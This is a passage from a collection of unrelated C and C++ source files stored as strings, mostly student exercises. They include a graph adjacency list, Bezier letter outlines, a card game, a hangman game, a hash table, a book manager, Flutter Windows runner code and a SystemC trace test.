{\r\n                    temp = head[i];\r\n                    while (temp->next != NULL)\r\n                    {\r\n                        temp = temp->next;\r\n                    }\r\n                    temp->next = p;\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nvoid adjmatlist::displaym()\r\n{\r\n    cout << \"\\n\";\r\n    for (j = 0; j < n; j++)\r\n    {\r\n        cout << \"\\t\" << v[j];\r\n    }\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        cout << \"\\n \" << v[i];\r\n        for (j = 0; j < n; j++)\r\n        {\r\n            cout << \"\\t\" << m[i][j];\r\n        }\r\n        cout << \"\\n\";\r\n    }\r\n}\r\n\r\nvoid adjmatlist::displaya()\r\n{\r\n    cout << \"\\nAdjacency list is: \";\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (head[i] == NULL)\r\n        {\r\n            cout << \"\\nAdjacency list not present\";\r\n            break;\r\n        }\r\n        else\r\n        {\r\n            cout << \"\\n\" << head[i]->vertex;\r\n            temp = head[i]->next;\r\n            while (temp != NULL)\r\n            {\r\n                cout << \"-> \" << temp->vertex;\r\n                temp = temp->next;\r\n            }\r\n        }\r\n    }\r\n    cout << \"\\nPath and time required to reach cities is: \";\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (head[i] == NULL)\r\n        {\r\n            cout << \"\\nAdjacency list not present\";\r\n            break;\r\n        }\r\n        else\r\n        {\r\n            temp = head[i]->next;\r\n            while (temp != NULL)\r\n            {\r\n                cout << \"\\n\" << head[i]->vertex;\r\n                cout << \"-> \" << temp->vertex << \"\\n [Time required: \" << temp->time << \" Min ]\";\r\n                temp = temp->next;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int m;\r\n    adjmatlist a;\r\n    while (1)\r\n    {\r\n        cout << \"\\n\\nEnter the choice: \";\r\n        cout << \"\\n1. Enter graph\";\r\n        cout << \"\\n2. Display adjacency matrix for cities\";\r\n        cout << \"\\n3. Display adjacency list for cities\";\r\n        cout << \"\\n4. Exit\\n\";\r\n        cin >> m;\r\n        switch (m)\r\n        {\r\n        case 1:\r\n            a.getgraph();\r\n            break;\r\n        case 2:\r\n            a.displaym();\r\n            break;\r\n        case 3:\r\n            a.displaya();\r\n            break;\r\n        case 4:\r\n            exit(0);\r\n        default:\r\n            cout << \"\\nUnknown choice\";\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"draw.hpp\"\n\nstd::vector<std::vector<Bezier> > draw_A() {\n    std::vector<std::vector<Bezier> > A(2);\n    // Outer outline\n    A[0].emplace_back(Point2D(10, 100), Point2D(40, 0));\n    A[0].emplace_back(Point2D(40, 0), Point2D(60, 0));\n    A[0].emplace_back(Point2D(60, 0), Point2D(90, 100));\n    A[0].emplace_back(Point2D(90, 100), Point2D(67, 100));\n    A[0].emplace_back(Point2D(67, 100), Point2D(60, 75));\n    A[0].emplace_back(Point2D(60, 75), Point2D(40, 75));\n    A[0].emplace_back(Point2D(40, 75), Point2D(33, 100));\n    A[0].emplace_back(Point2D(33, 100), Point2D(10, 100));\n    // Inner triangle\n    A[1].emplace_back(Point2D(41, 56), Point2D(50, 32));\n    A[1].emplace_back(Point2D(50, 32), Point2D(59, 56));\n    A[1].emplace_back(Point2D(59, 56), Point2D(41, 56));\n    return A;\n}\n\nstd::vector<std::vector<Bezier> > draw_B(){\n    std::vector<std::vector<Bezier> > B(3);\n    // Outer outline\n    B[0].emplace_back(Point2D(10, 100), Point2D(10, 0));\n    B[0].emplace_back(Point2D(10, 0), Point2D(50, 0));\n    B[0].emplace_back(Point2D(50, 0), Point2D(90, 25), Point2D(90, 0));\n    B[0].emplace_back(Point2D(90, 25), Point2D(70, 50), Point2D(90, 50));\n    B[0].emplace_back(Point2D(70, 50), Point2D(90, 75), Point2D(90, 50));\n    B[0].emplace_back(Point2D(90, 75), Point2D(50, 100), Point2D(90, 100));\n    B[0].emplace_back(Point2D(50, 100), Point2D(10, 100));\n    // Upper inner hole\n    B[1].emplace_back(Point2D(30, 40), Point2D(30, 20));\n    B[1].emplace_back(Point2D(30, 20), Point2D(50, 20));\n    B[1].emplace_back(Point2D(50, 20), Point2D(70, 30), Point2D(70, 20));\n    B[1].emplace_back(Point2D(70, 30), Point2D(50, 40), Point2D(70, 40));\n    B[1].emplace_back(Point2D(50, 40), Point2D(30, 40));\n    // Lower inner hole\n    B[2].emplace_back(Point2D(30, 80), Point2D(30, 60));\n    B[2].emplace_back(Point2D(30, 60), Point2D(50, 60));\n    B[2].emplace_back(Point2D(50, 60), Point2D(70, 70), Point2D(70, 60));\n    B[2].emplace_back(Point2D(70, 70), Point2D(50, 80), Point2D(70, 80));\n    B[2].emplace_back(Point2D(50, 80), Point2D(30, 80));\n    return B;\n}\n\nstd::vector<std::vector<Bezier> > draw_C(){\n    std::vector<std::vector<Bezier> > C(1); // One vector inside the outer vector\n    // Outer outline\n    C[0].emplace_back(Point2D(90, 0), Point2D(50, 0));\n    C[0].emplace_back(Point2D(50, 0), Point2D(10, 50), Point2D(10, 0));\n    C[0].emplace_back(Point2D(10, 50), Point2D(50, 100), Point2D(10, 100));\n    C[0].emplace_back(Point2D(50, 100), Point2D(90, 100));\n    C[0].emplace_back(Point2D(90, 100), Point2D(90, 80));\n    C[0].emplace_back(Point2D(90, 80), Point2D(50, 80));\n    C[0].emplace_back(Point2D(50, 80), Point2D(30, 50), Point2D(30, 80));\n    C[0].emplace_back(Point2D(30, 50), Point2D(50, 20), Point2D(30, 20));\n    C[0].emplace_back(Point2D(50, 20), Point2D(90, 20));\n    C[0].emplace_back(Point2D(90, 20), Point2D(90, 0));\n    return C;\n}\n\nstd::vector<std::vector<Bezier> > draw_D(){\n    std::vector<std::vector<Bezier> > D(2);\n    // Outer outline\n    D[0].emplace_back(Point2D(10, 0), Point2D(50, 0));\n    D[0].emplace_back(Point2D(50, 0), Point2D(90, 50), Point2D(90, 0));\n    D[0].emplace_back(Point2D(90, 50), Point2D(50, 100), Point2D(90, 100));\n    D[0].emplace_back(Point2D(50, 100), Point2D(10, 100));\n    D[0].emplace_back(Point2D(10, 100), Point2D(10, 0));\n    // Inner hole\n    D[1].emplace_back(Point2D(30, 20), Point2D(50, 20));\n    D[1].emplace_back(Point2D(50, 20), Point2D(70, 50), Point2D(70, 20));\n    D[1].emplace_back(Point2D(70, 50), Point2D(50, 80), Point2D(70, 80));\n    D[1].emplace_back(Point2D(50, 80), Point2D(30, 80));\n    D[1].emplace_back(Point2D(30, 80), Point2D(30, 20));\n    return D;\n}\n\nstd::vector<std::vector<Bezier> > draw_E(){\n    std::vector<std::vector<Bezier> > E(1);\n    // Outer outline\n    E[0].emplace_back(Point2D(10, 0), Point2D(10, 100));\n    E[0].emplace_back(Point2D(10, 100), Point2D(90, 100));\n    E[0].emplace_back(Point2D(90, 100), Point2D(90, 80));\n    E[0].emplace_back(Point2D(90, 80), Point2D(30, 80));\n    E[0].emplace_back(Point2D(30, 80), Point2D(30, 60));\n    E[0].emplace_back(Point2D(30, 60), Point2D(90, 60));\n    E[0].emplace_back(Point2D(90, 60), Point2D(90, 40));\n    E[0].emplace_back(Point2D(90, 40), Point2D(30, 40));\n    E[0].emplace_back(Point2D(30, 40), Point2D(30, 20));\n    E[0].emplace_back(Point2D(30, 20), Point2D(90, 20));\n    E[0].emplace_back(Point2D(90, 20), Point2D(90, 0));\n    E[0].emplace_back(Point2D(90, 0), Point2D(10, 0));\n    return E;\n}\n\n\n\nstd::vector<std::vector<Bezier> > draw_F(){\n    std::vector<std::vector<Bezier> > F(1);\n    // Outer outline\n    F[0].emplace_back(Point2D(10, 0), Point2D(10, 100));\n    F[0].emplace_back(Point2D(10, 100), Point2D(30, 100));\n    F[0].emplace_back(Point2D(30, 100), Point2D(30, 60));\n    F[0].emplace_back(Point2D(30, 60), Point2D(90, 60));\n    F[0].emplace_back(Point2D(90, 60), Point2D(90, 40));\n    F[0].emplace_back(Point2D(90, 40), Point2D(30, 40));\n    F[0].emplace_back(Point2D(30, 40), Point2D(30, 20));\n    F[0].empl",
    "#include <iostream>\r\n#include <vector>\r\n#include <stdlib.h>\r\n#include <time.h>\r\n#include <iomanip>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\n\r\nstruct kart{\r\n    string type;\r\n    int point;\r\n};\r\n\r\nstruct player{\r\n    string name;\r\n    int point = 0;\r\n    vector<kart> kart_mojod;\r\n    vector<kart> kart_nemayesh_mordegan;\r\n};\r\n\r\n\r\nvector<kart> karts;\r\n\r\nint max_point;\r\nint player_number;\r\n\r\nvoid control_unit(player *);\r\nvoid meghdardehi_player(vector<kart> *);\r\nvoid play_game(player *);\r\nvoid what_max_point();\r\nvoid signin_player(player *);\r\nvoid start();\r\nvoid amaliat(player * , int  , bool &);\r\nvoid show_kartsgame(player * , int  , bool & );\r\nbool shart_emtiaz(player );\r\nvoid shomaresh_emtiaz(player *);\r\nbool shart_edame(player *);\r\nvoid tozie_kart(player *);\r\nint win_player_f(player *);\r\nvoid show_table(player *);\r\nvoid sort_players(player *);\r\nvoid end_game(player *);\r\nvoid show_curentkarts(vector<kart> );\r\n\r\nvoid meghdardehi_kartha(){\r\n    srand(time(0));\r\n    kart kohnepich[30];\r\n    kart kalekado[30];\r\n    kart gorbegor[30];\r\n\r\n    for(int i=0 ; i<30 ; i++){\r\n        \r\n        kohnepich[i].type = \"kohne pich\";\r\n        kohnepich[i].point = (rand() % 15) + 1;\r\n        kalekado[i].type = \"kale kadoo\";\r\n        kalekado[i].point = (rand() % 15) + 1;\r\n        gorbegor[i].type = \"gor be gor\";\r\n        gorbegor[i].point = (rand() % 15) + 1;\r\n    }\r\n\r\n    for(int i=0 ; i<30 ; i++)\r\n    {\r\n        karts.push_back(kohnepich[i]);\r\n        karts.push_back(kalekado[i]);\r\n        karts.push_back(gorbegor[i]);\r\n    }\r\n}\r\n\r\nint main()\r\n{   \r\n    system(\"cls\");\r\n    cout << \"\\n\\n\\n\\n be bazi kastel khoshomadid.\\n\";\r\n    cout << \"\\n\\n\\n\\t main menu\\n\";\r\n    cout << \"\\n 1-shoroe bazi jadid\\n 2-exit\\n\\nentekhab: \";\r\n    int ch;\r\n    cin >> ch;\r\n\r\n    switch (ch)\r\n    {\r\n    case 1: start();break;\r\n    case 2: return 0; break;\r\n    default:\r\n        cout << \"entekhab eshtebah ast.\";\r\n        getch();\r\n        main();\r\n    }\r\n}\r\n\r\nvoid what_max_point()\r\n{\r\n    cout << \"hadaxar emtiaz bazi chand bashad? \";\r\n    cin >> max_point;\r\n}\r\n\r\nvoid signin_player(player *p)\r\n{\r\n\r\n    for(int i=0 ; i<player_number ; i++){\r\n        cout << \"name bazikon shomare \" << i+1 << \" ra vared konid: \";\r\n        cin >> p[i].name ;\r\n    }\r\n}\r\n\r\nvoid meghdardehi_player(vector<kart> *k){\r\n    srand(time(0));\r\n    int count = (rand() % (karts.size()-1));\r\n    while(k->size() < 3){\r\n        k->push_back(karts[count]);\r\n        karts.erase(karts.begin()+count);\r\n    }\r\n}\r\n\r\nvoid amaliat(player *p , int i , bool &b)\r\n{\r\n    cout << \"shomare kart mored nazar az dast khod ra entekhab konid: \";\r\n    int choosen;\r\n    cin >> choosen;\r\n\r\n    cout << \"shomare daste kart mored nazar barai entaghal kart entekhab shode ra entekhab konid: \";\r\n    int row_choosen;\r\n    cin >> row_choosen;\r\n\r\n    cout << \"shomare kart mored nazar dar dastekart entekhab shode barai entaghal kart ra entekhab konid: \";\r\n    int kart_gharargiri;\r\n    cin >> kart_gharargiri;\r\n\r\n    if(!(choosen >= 1 && choosen <= 3) || !(row_choosen >= 1 && row_choosen <= player_number) || !(kart_gharargiri >= 1 && kart_gharargiri <= 6))\r\n    {\r\n        cout << \"adad vorodi eshtebah ast.\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan.size() < kart_gharargiri){\r\n        p[row_choosen-1].kart_nemayesh_mordegan.push_back(p[i].kart_mojod[choosen-1]);\r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1].type == p[i].kart_mojod[choosen-1].type){\r\n        \r\n        bool u = 1;\r\n        for(auto &j : p[row_choosen-1].kart_nemayesh_mordegan){\r\n            \r\n            if(j.type == p[i].kart_mojod[choosen-1].type && j.point == p[i].kart_mojod[choosen-1].point){\r\n                j = p[i].kart_mojod[choosen-1];\r\n                u = 0;\r\n            }\r\n        }\r\n        if(u)\r\n            p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1] =  p[i].kart_mojod[choosen-1];\r\n        \r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    \r\n    else{\r\n        cout << \"kart ha ba ham, ham type nistand. bayad kart hai entekhab shode ham type va ham noe bashand.\\n\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    \r\n    if(p[row_choosen-1].kart_nemayesh_mordegan.size() == 6 || p[i].kart_mojod.size() == 0) b = 1;\r\n}\r\n\r\nvoid show_curentkarts(vector<kart> curentkart){\r\n    cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n    for(int k=0 ; k<3 ; k++){\r\n        cout << setfill('-') << setw(16) << \"  \";\r\n    }\r\n    cout << setfill(' ') << setw(29) <<'+' << endl;\r\n    for(int l=0 ; l<7 ; l++){\r\n        if(l == 2){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n            for(int k=0 ; k<curentkart.size() ; k++){\r\n                cout << \"| \" << curentkart[k].type << \" |  \";\r\n            }\r\n            \r\n            cout << setfill(' ') << setw(29) <<'+' << endl;\r\n        }\r\n        else if(l == 4){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n",
    "class Solution {\npublic:\n    vector<long long> maximumSegmentSum(vector<int>& nums, vector<int>& removeQueries) {\n        int n = nums.size();\n        multiset<long long> s;\n        s.insert(0);\n        set<pair<int, int>> in;\n        vector<long long> pre(n, nums[0]);\n        for(int i = 1; i < n; i++) pre[i] = pre[i - 1] + nums[i];\n        \n        in.insert({0, n - 1});\n        \n        s.insert(pre[n - 1]);\n        \n        vector<long long> ans;\n        for(auto p : removeQueries) {\n            auto it = in.upper_bound({p, 2e9});\n            it--;\n            \n            long long L = (p ? pre[p - 1] : 0) - (it -> first ? pre[it -> first - 1] : 0);\n            long long R = pre[it -> second] - pre[p];\n            long long T = pre[it -> second] - (it -> first ? pre[it -> first - 1] : 0);\n            \n            s.erase(s.find(T));\n            if(it -> first <= p - 1) {\n                in.insert({it -> first, p - 1});\n                s.insert(L);\n            }\n            if(it -> second >= p + 1) {\n                in.insert({p + 1, it -> second});\n                s.insert(R);\n            }\n            \n            in.erase(it);\n            ans.push_back(*s.rbegin());\n        }\n        return ans;\n    }\n};\n",
    "#include \"Book.h\"\nint main()\n{\n\tint NBooks=NULL;\n    FILE* fp = nullptr;\n    Book* books=new Book[1];\n    \n    fopen_s(&fp, \"books.txt\", \"r\"); //\u00e7\u00e0\u00ef\u00ee\u00e2\u00ed\u00e5\u00ed\u00ed\u00ff \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3 \n    if (fp != NULL) \n    {    \n        fread(&NBooks, sizeof(int), 1, fp);\n        delete[] books;\n        books = new Book[NBooks];\n        for(int i =0 ;i<NBooks;i++)\n        {\n            books[i].loadFromBinFile(fp);\n        }\n        fclose(fp);\n    }\n\n\n\tint menu,deleteId,menuSort,menuEdit,editId,menuFind;\n    Book tmp;\n\tdo \n\t{\n        cout << \"--------------------------------\\n\";\n        cout << \"|             MENU             |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|1.Show all books in library   |\\n\";\n        cout << \"|2.Add new book                |\\n\";\n        cout << \"|3.Remove book                 |\\n\";\n        cout << \"|4.Show sorted books           |\\n\";\n        cout << \"|5.Edit info in book           |\\n\";\n        cout << \"|6.Search book                 |\\n\";\n        cout << \"|------------------------------|\\n\";\n        cout << \"|0.Exit                        |\\n\";\n        cout << \"--------------------------------\\n\";\n        cout << \" >>> \"; cin >> menu;\n\t\n        switch (menu)\n        {\n        \n        case 1:\n            cout << \"\\n\\n\\n\";\n            for(int i = 0;i<NBooks;i++)\n            {\n                books[i].showBook();\n            }\n            cout << \"\\n\\n\\n\";\n            break;\n        \n        case 2:\n            tmp.addNewBook();\n            if (NBooks==NULL) \n            {\n                cout << \"asd\";\n                books[0] = tmp;\n                NBooks=1;\n            }\n            else\n            {\n                addItemBack(books, NBooks, tmp);\n            }\n            break;\n        \n        case 3:\n            char deleteName[50];\n            cout << \"\\n\\nEnter book name to delete - \";\n            cin.ignore();\n            cin.getline(deleteName,50);\n            cout << endl;\n            deleteId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, deleteName) == 0) \n                {\n                    deleteId = i;\n                    break;\n                }\n            }\n            if(deleteId!=-1)\n            {\n            removeItem(books, NBooks, deleteId);\n            cout << \"Deleted!\\n\" << endl;\n            }\n            else \n            {\n                cout << \"Not found book with that name!\\n\"<<endl;\n            }\n            break;\n\n        case 4:\n            do {\n                cout << \"\\n\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|                           SORT                     |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \"|1.Sort by pages (from max to min)                   |\\n\";\n                cout << \"|2.Sort by develope year (from older to newest)      |\\n\";\n                cout << \"|3.Sort by add to library year (from older to newest)|\\n\";\n                cout << \"|----------------------------------------------------|\\n\";\n                cout << \"|0.Back to main menu                                 |\\n\";\n                cout << \"------------------------------------------------------\\n\";\n                cout << \" >>> \"; cin >> menuSort;\n                cout << \"\\n\\n\";\n                \n                switch (menuSort) \n                {\n                case 1:\n                    showSortedPages(books, NBooks);\n                    break;\n                case 2:\n                    showSortedDateWriten(books, NBooks);\n                    break;\n                case 3:\n                    showSortedDateAdded(books, NBooks);\n                    break;\n                case 0:\n                    break;\n                default:\n                    cout << \"Error command!\"<<endl;\n                    break;\n                }\n            } while (menuSort != 0);\n                break;\n        case 5:\n            char editingBook[50];\n            cout << \"\\nEnter name of book for edit - \";\n            cin.ignore();\n            cin.getline(editingBook, 50);\n            cout << endl;\n            editId = -1;\n            for (int i = 0; i < NBooks; i++)\n            {\n                if (strcmp(books[i].name, editingBook) == 0)\n                {\n                    editId = i;\n                    break;\n                }\n            }\n            if(editId!=-1)\n            {\n                do {\n\n                    cout << \"\\n\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|                          EDIT                 |\\n\";\n                    cout << \"-------------------------------------------------\\n\";\n                    cout << \"|1. Edit type of book                           |\\n\";\n                    cout << \"|2. Edit name of book                           |\\n\";\n                    ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <stdlib.h>\nusing namespace std;\n\nint main(){\n    \n    char palavra[30], letra[1], secreta[30];\n    int tam, i, chances, acertos;\n    bool acerto;\n    \n    chances = 6;\n    tam = 0;\n    i = 0;\n    acerto = false;\n    acertos = 0;\n    \n    cout << \"Digite a palavra secreta: \\n\";\n    cin >> palavra;\n    system (\"clear\");\n    \n    while (palavra[i] != '\\0'){\n        i++;\n        tam++;\n    }\n    \n    for(i=0; i<tam; i++){\n        secreta[i] = '-';\n    }\n    \n    while ((chances > 0) && (acertos < tam)){\n        cout << \"Chances restantes: \" << chances << \"\\n\\n\";\n        cout << \"Palvra secreta: \";\n        for(i=0; i<tam; i++){\n            cout << secreta[i];\n        }\n        cout << \"\\n\\nDigite uma letra: \";\n        cin >> letra[0];\n        for(i=0; i<tam; i++){\n            if (palavra[i] == letra[0]){\n                acerto = true;\n                secreta[i] = palavra[i];\n                acertos++;\n            }\n        }\n        if (!acerto){\n            chances--;\n        }\n        acerto = false;\n        system(\"clear\");\n    }\n    if (acertos==tam){\n        cout << \"Voce venceu\";\n        \n    }else{\n        cout << \"perdeu, burro!\"; \n    }\n    return 0;\n    \n}",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  test02.cpp -- \n\n  Original Author: Martin Janssen, Synopsys, Inc., 2002-02-15\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n  changes you are making here.\n\n      Name, Affiliation, Date:\n  Description of Modification:\n\n *****************************************************************************/\n\n#include \"systemc.h\"\n\nSC_MODULE( proc1 )\n{\n  SC_HAS_PROCESS( proc1 );\n\n  sc_in<bool> clk;\n\n  unsigned char obj1;\n  unsigned short obj2;\n  unsigned int obj3;\n  unsigned long obj4;\n\n  proc1( sc_module_name NAME,\n\t sc_signal<bool>& CLK )\n  {\n    clk(CLK);\n    SC_THREAD( entry );\n    sensitive << clk;\n    obj1 = 0;\n    obj2 = 0;\n    obj3 = 0;\n    obj4 = 0;\n  }\n\n  void entry();\n};\n  \nvoid proc1::entry() \n{\n  wait();\n  while(true) {\n    obj1 = 7;\n    obj2 = 31;\n    obj3 = 1023;\n    obj4 = 2047;\n    wait();\n    obj1 = 1;\n    obj2 = 32;\n    obj3 = 1024;\n    obj4 = 2048;\n    wait();\n  }\n}\n  \n\nint sc_main(int ac, char *av[])\n{\n  sc_trace_file *tf;\n  sc_signal<bool> clock;\n\n  proc1 P1(\"P1\", clock);\n\n  tf = sc_create_vcd_trace_file(\"test02\");\n  sc_trace(tf, P1.obj1, \"Char\");\n  sc_trace(tf, P1.obj2, \"Short\");\n  sc_trace(tf, P1.obj3, \"Int\");\n  sc_trace(tf, P1.obj4, \"Long\");\n  sc_trace(tf, clock, \"Clock\");\n\n  clock.write(0);\n  sc_start(0, SC_NS);\n  for (int i = 0; i< 10; i++) {\n    clock.write(1);\n    sc_start(10, SC_NS);\n    clock.write(0);\n    sc_start(10, SC_NS);\n  }\n  sc_close_vcd_trace_file( tf );\n  return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"blog_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <stdio.h>\r\n#include<stdlib.h>\r\n#define TABLE_SIZE 10\r\nint h[TABLE_SIZE]={NULL};\r\nvoid insert()\r\n{\r\nint key,index,i,flag=0,hkey;\r\nprintf(\"\\nenter a value to insert into hash table\\n\");\r\nscanf(\"%d\",&key);\r\nhkey=key%TABLE_SIZE;\r\nfor(i=0;i<TABLE_SIZE;i++)\r\n {\r\n index=(hkey+i)%TABLE_SIZE;\r\n if(h[index] == NULL)\r\n {\r\n\r\n h[index]=key;\r\n break;\r\n }\r\n }\r\n if(i == TABLE_SIZE)\r\n printf(\"\\nelement cannot be inserted\\n\");\r\n}\r\nvoid search()\r\n{\r\nint key,index,i,flag=0,hkey;\r\nprintf(\"\\nenter search element\\n\");\r\nscanf(\"%d\",&key);\r\nhkey=key%TABLE_SIZE;\r\nfor(i=0;i<TABLE_SIZE; i++)\r\n{\r\n index=(hkey+i)%TABLE_SIZE;\r\n if(h[index]==key)\r\n {\r\n printf(\"value is found at index %d\",index);\r\n break;\r\n }\r\n }\r\n if(i == TABLE_SIZE)\r\n printf(\"\\n value is not found\\n\");\r\n}\r\nvoid display()\r\n{\r\n int i;\r\n printf(\"\\nelements in the hash table are \\n\");\r\n for(i=0;i< TABLE_SIZE; i++)\r\n\r\n printf(\"\\nat index %d \\t value = %d\",i,h[i]);\r\n}\r\nmain()\r\n{\r\n int opt,i;\r\n while(1)\r\n {\r\n printf(\"\\nPress 1. Insert\\t 2. Display \\t3. Search \\t4.Exit \\n\");\r\n scanf(\"%d\",&opt);\r\n switch(opt)\r\n {\r\n case 1:\r\n insert();\r\n break;\r\n case 2:\r\n display();\r\n break;\r\n case 3:\r\n search();\r\n break;\r\n case 4:exit(0);\r\n }\r\n }\r\n}\r\n",
    "//A program that keeps track of the infected people around the world\r\n#include <iostream>\r\nusing namespace std;\r\nint main ()\r\n{\r\n\tint countries, infected;\r\n\tfloat sum, average;\r\n\r\n\t\r\n\tcout << \"This is a program that keeps track of the infected people around the world\" << endl << endl;\r\n\t\r\n\t\r\n\tcout << \"Enter the number of the countries: \"; // stores the number of countries (the number of times the loop will continue)\r\n\tcin >> countries;\r\n\t\r\n\t\t// create an array that stores each name of each country and the number of infected people in these countries\r\n\tstring array[countries];\r\n\tint arr[countries];\r\n\r\n\r\n\r\n\tfor (int i = 0; i < countries; i++)\r\n\t{\r\n\t\tcout << \"Enter name of country number \" << i + 1 << \" and the number of infected people in it: \";\r\n\t\tcin >> array[i];\r\n\t\tcin >> arr[i];\r\n\t\tcout << endl;\r\n\t\t\r\n    }\r\n\t\r\n\tcout << endl << endl;\r\n\r\n\r\n    // create a loop to be able to sum the total number of cases for all countries\r\n    for (int s = 0; s < countries; s++)\r\n    {\r\n    \tsum+=arr[s];\r\n\t}\r\n\tcout << \"The total number of infected cases for all countries is: \" << sum << endl;\r\n\t\r\n\t\r\n\t// get the average by dividing the sum of cases and the total number of values\r\n\taverage = sum/countries;\r\n\tcout << \"The average infections for all countries is: \" << average << endl;\r\n\t\r\n\tint max = arr[0];\r\n\t// create a loop to be able to find the highest number of infection\r\n    for(int m = 1; m < countries; m++)\r\n    {\r\n    \t\r\n\r\n       if(max < arr[m]) \r\n       {\r\n       \t  max = arr[m]; \r\n\t   }\r\n\r\n    }\r\n    cout << \"The highest number of infections is: \" << max; \r\n\t\r\n\t\r\n\treturn 0;\r\n}\r\n",
